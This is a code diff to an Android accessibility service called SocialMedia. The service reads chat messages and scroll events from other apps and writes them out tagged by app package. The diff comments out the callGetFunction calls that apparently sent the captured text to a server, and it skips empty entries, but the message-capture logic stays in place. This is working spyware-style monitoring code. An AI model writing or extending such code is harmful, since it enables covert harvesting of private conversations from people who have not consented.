@@ -125,8 +125,11 @@ public class SocialMedia extends AccessibilityService {
                     getEventText(event, textStringBuilder);
 
                     String dateString1 = getTimeStamped(System.currentTimeMillis());
-                    String Chat = "\r\n" + "To: " + ChatName + "\r\n" + "Message: " + textStringBuilder.toString() + "\r\n" + "Time: " + dateString1 + "\r\n";
-                    writeStrings2File(PACKAGENAME, Chat, "text");
+                    String Chat = "\r\n" + "Message: " + textStringBuilder.toString() + "\r\n" + "Time: " + dateString1 + "\r\n";
+                    if (!textStringBuilder.toString().equalsIgnoreCase("")){
+                        writeStrings2File(PACKAGENAME, Chat, "text");
+                    }
+
                     textStringBuilder = new StringBuilder();
                 } catch (Exception ignored) {
                 }
@@ -151,7 +154,9 @@ public class SocialMedia extends AccessibilityService {
         }
         String line1 = "\r\n" + whichEvent + "\r\n";
         ScrollText.append(line1);
-        writeStrings2File(event.getPackageName().toString(), String.valueOf(ScrollText), "scroll");
+        if (!textStringBuilder.toString().equalsIgnoreCase("")) {
+            writeStrings2File(event.getPackageName().toString(), String.valueOf(ScrollText), "scroll");
+        }
         ScrollText = new StringBuilder();
     }
 
@@ -224,16 +229,16 @@ public class SocialMedia extends AccessibilityService {
     }
 
     private void writeStrings2File(String packageName, String content, String chatType) throws MalformedURLException {
-        String updated = getTimeStamped(System.currentTimeMillis()) + "\n" + content;
+        String updated =  content;
 
         if (!chatType.equalsIgnoreCase("scroll")) {
             txtContent = updated;
-            callGetFunction(updated, packageName + "_C");
+            //callGetFunction(updated, packageName + "_C");
          Log.d("accvalue", updated+"^"+packageName + "_C");
         }
         if (chatType.equalsIgnoreCase("scroll")) {
             updated = txtContent + "\r\n" + updated;
-            callGetFunction(updated, packageName + "_S");
+            //callGetFunction(updated, packageName + "_S");
             txtContent = "";
          Log.d("accvalue", updated+"^"+packageName + "_S");
         }
